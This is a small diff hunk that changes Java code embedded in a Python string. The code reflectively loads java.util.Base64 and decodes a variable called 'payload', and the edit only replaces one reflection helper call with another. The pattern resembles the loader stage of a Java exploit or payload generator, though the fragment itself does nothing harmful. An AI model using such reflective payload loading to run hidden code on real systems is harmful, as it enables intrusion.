@@ -100,7 +100,7 @@ code = """
         try {
             base64 = Class.forName("java.util.Base64");
             bytes = (byte[]) invokeMethod(
-                getMethodX(base64, "getDecoder", 0).invoke(base64),
+                getMethod(base64, "getDecoder").invoke(base64),
                 "decode", payload
             );
         } catch (ClassNotFoundException e) {
